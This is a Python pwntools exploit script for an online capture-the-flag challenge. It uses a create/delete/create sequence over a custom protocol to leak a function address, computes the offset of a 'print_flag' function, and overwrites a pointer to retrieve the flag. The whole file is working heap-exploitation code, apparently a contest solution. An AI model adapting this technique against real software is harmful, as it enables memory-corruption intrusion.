import socket
import proto_util
from pwn import *
LOGLEVEL = 'info'
TIMEOUT = 9999

def start():
    context.log_level = LOGLEVEL
    if args['REMOTE']:
        return remote('trellixhax-free-yo-radicals-part-iii.chals.io', 443, ssl=True)
    else:
        return remote('localhost', 8003)

def goto_wait_for_data(p, verb=False):
    msg = p.recvuntil(b'Waiting for data... \n', timeout=TIMEOUT)
    if msg == '':
        log.error('Failed to recv "waiting for data..." message')
        exit(1)
    if verb:
        print('Received data: %s' % msg.decode('utf-8'))

def exploit(p,addr):
    log.success('Sending create')
    payload = proto_util.proto_packet(action='create', data=b'\x0cAAABBBBCCCCDDDD', value=1337)
    p.send(payload)
    goto_wait_for_data(p)
    log.success('Sending delete')
    payload = proto_util.proto_packet(action='delete', data='foobar', value=1337)
    p.send(payload)
    goto_wait_for_data(p)
    log.success('Sending create')
    #print('NUMBER: %s' % p64(addr, endianness='big'))
    payload = proto_util.proto_packet(action='create', data=b'\x04\x00\x00\x00AAAA' + p64(addr), value=0x0c000000)
    p.send(payload)
    goto_wait_for_data(p)
    log.success('Sending print')
    payload = proto_util.proto_packet(action='print', value=1)
    p.send(payload)
    flag = p.recvuntil(b'}')
    log.success('Flag: %s' % flag.decode('utf-8'))
    goto_wait_for_data(p)

def leak(p):
    goto_wait_for_data(p)
    log.success('Sending create')
    payload = proto_util.proto_packet(action='create', data=b'dead', value=0x0c000000)
    p.send(payload)
    goto_wait_for_data(p)
    log.success('Sending delete')
    payload = proto_util.proto_packet(action='delete', data='dead', value=1337)
    p.send(payload)
    goto_wait_for_data(p)
    log.success('Sending create')
    payload = proto_util.proto_packet(action='create', data=b'\x0cAAABBBBCCCCDDDD', value=0x4141414141414141)
    p.send(payload)
    goto_wait_for_data(p)
    log.success('Sending print')
    payload = proto_util.proto_packet(action='print', value=1)
    p.send(payload)
    p.recvuntil(b'AAAAAAAA')
    addr = p.recvuntil(b'\t')
    goto_wait_for_data(p)

    return addr

if __name__ == '__main__':
    p = start()

    if not p.recvuntil(b'\n') == b'Connected\n':
        log.error('Failed to connect')
    else:
        log.success('Connected')

    addr = int.from_bytes(leak(p)[:-1], 'little')
    print_flag_addr = addr + 0x64
    log.success('Address of send_num: %s' % hex(addr))
    log.success('Address of print_flag: %s' % hex(print_flag_addr))

    exploit(p, addr+0xaa)

